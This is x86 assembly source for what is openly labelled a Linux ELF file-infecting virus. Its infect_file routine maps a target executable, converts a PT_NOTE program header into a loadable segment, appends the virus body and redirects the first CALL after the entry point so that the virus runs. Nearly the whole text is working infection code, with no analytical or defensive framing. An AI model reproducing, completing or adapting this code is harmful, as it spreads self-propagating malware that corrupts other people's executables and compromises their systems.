;------------------------------------------------------------------------------
infect_file:	pusha
		mov	ebx, [esp + 36]			; filename
; we can't use stack for local variables due to kernel stack limits (~6k)
		mov	ebp, [esp + 40]			; buffer

		movb	eax, 5
		movb	ecx, 2
		int	0x80				; open
		or	eax, eax
		js	.failed_return

		xchg	eax, ebx
		
		movb	eax, 19
		movb	ecx, 0
		movb	edx, 2
		int	0x80				; lseek
		cmp	eax, 1024
		jb	.failed_close

		xchg	edx, eax			; edx <- file length

		push	ebx				
		push	byte 0				; offset	
		push	ebx				; handle
		push	byte 1				; MAP_SHARED
		push	byte 3				; PROT_READ|PROT_WRITE
		push	edx				; file length
		push	byte 0				; NULL
		mov	ebx, esp
		movb	eax, 90
		int	0x80				; mmap
		add	esp, byte 24
		pop	ebx				; restore file handle
		cmp	eax, 0xfffff000
		ja	.failed_close

		xchg	eax, esi			; esi = map

; check ELF header
		cmp	dword [esi], 0x464c457f		; ELF file?
		jne	.failed_unmap
		cmp	dword [esi + 16], 0x00030002	; e_type == ET_EXEC &&
		jne	.failed_unmap			; e_machine == EM_386
		mov	al, [esi + 7]			; e_ident[EI_OSABI]
		cmp	al, 3				; Linux?
		je	.header_ok
		cmp	al, 0				; None? ;-)
		jne	.failed_unmap
.header_ok:

; Find PHDR of type PT_NOTE
		call	phdr_addr
.find_note:	cmp	dword [edi], 4			; PT_NOTE?
		je	.note_found
		add	edi, byte 32
		loop	.find_note
		jmp	.failed_unmap
.note_found:

; Turn it into PT_LOAD
		cld
		movb	eax, 1
		stosd					; p_flags = PT_LOAD
		mov	eax, edx
		stosd					; p_offset = file len
		push	edi
		xor	eax, eax
		dec	eax
		call	phdr_addr
.find_laddr:	cmp	[edi + 8], eax
		jae	.next_laddr
		mov	eax, [edi + 8]
.next_laddr:	add	edi, byte 32
		loop	.find_laddr
		pop	edi
		inc	eax
		jz	.failed_unmap
		sub	eax, (2 * PAGE_SIZE + 1)
		mov	ecx, edx			; file length		
		and	ecx, (PAGE_SIZE - 1)
		add	eax, ecx
		mov	[ebp + B_VIRVADDR], eax
		stosd					; p_vaddr
		stosd					; p_paddr
		mov	eax, VIRUS_SIZE
		stosd					; p_filesz
		stosd					; p_memsz
		movb	eax, 6				; PF_R | PF_W
		stosd					; p_flags

; Find code segment (type == PT_LOAD && p_offset == 0)
; FIXME! the _real_ check must be:
; (phdr.p_vaddr <= ehdr.e_entry < (phdr.p_vaddr + phdr.p_memsz))
		call	phdr_addr
.find_code:	mov	eax, [edi]			; p_type
		dec	eax				; PT_LOAD?
		jnz	.next_code
		mov	eax, [edi + 4]			; p_offset
		or 	eax, eax
		jz 	.code_found
.next_code:	add	edi, byte 32
		loop	.find_code
		jmp	.failed_unmap
.code_found:

; Find first call instruction
		lea	eax, [ebp + B_DISTABLE]
		push	eax		
		mov	eax, [esi + 24]			; entry point
		sub	eax, [edi + 8]			; - p_vaddr
		mov	ecx, [edi + 16]			; p_filesz
		sub	ecx, eax
		add	eax, esi
		push	ecx				; p_filesz - ep_offset
		push	eax
		call	find_call
		or	eax, eax
		jz	.failed_unmap

		mov	[ebp + B_CALLADDR], eax

; Copy virus to buffer
		push	esi
		push	edi
		lea	edi, [ebp + B_DISTABLE]
		push	edi
		call	get_addr
		mov	esi, eax
		mov	ecx, VIRUS_SIZE
		rep	movsb
		pop	edi
		mov	eax, [ebp + B_CALLADDR]
		mov	eax, [eax + 1]
		mov	[edi + O(calladdr)], eax
		pop	edi
		pop	esi

; Write virus body
		push	edx
		movb	eax, 4
		lea	ecx, [ebp + B_DISTABLE]
		mov	edx, VIRUS_SIZE		
		int	0x80				; write
		cmp	eax, edx
		pop	edx
		jne	.failed_unmap

; Ok, change address in call to virus entry point
		mov	ecx, [ebp + B_CALLADDR]		; (map + call_offset)
		mov	eax, ecx
		sub	eax, esi			; call_offset
		add	eax, [edi + 8]			; p_vaddr + call_offset
		sub	eax, [ebp + B_VIRVADDR]		; - virus_va
		lea	eax, [eax + 5]
		neg	eax
		mov	[ecx + 1], eax			; write new call

		xor	ebp, ebp
		inc	ebp
			
.unmap:		mov	ecx, edx			; map length
		push    ebx                             ; save handle
		movb	eax, 91
		mov	ebx, esi
		int	0x80				; unmap
		pop	ebx
		
.close:		push	byte 6
		pop	eax
		int	0x80				; close		

.return:	mov	[esp + 0x1c], ebp
		popa
		retn	8

.failed_unmap:	xor	ebp, ebp
		jmp	short .unmap
.failed_close:	xor	ebp, ebp
		jmp	short .close
.failed_return:	xor	ebp, ebp
		jmp	short .return

phdr_addr:	mov	edi, dword [esi + 28]		; e_phoff
		movzx	ecx, word  [esi + 44]		; e_phnum
		add	edi, esi
		ret
		
find_call:	pusha
		mov	ebx, [esp + 36]			; code
		mov	ecx, [esp + 40]			; size
		mov	ebp, [esp + 44]			; buffer
		push	ebp
		call	disasm_init		
.disasm:	push	ebx
		push	ebp
		call	disasm_main
		or	eax, eax
		js	.failed
		cmp	byte [ebx], 0xe8
		je	.return
		add	ebx, eax
		sub	ecx, eax
		cmp	ecx, 16
		ja	.disasm
.failed:	xor	ebx, ebx
.return:	mov	[esp + 0x1c], ebx
		popa
		retn	12
		
%include	"include/lde32bin.inc"			; LDE32 engine		
;------------------------------------------------------------------------------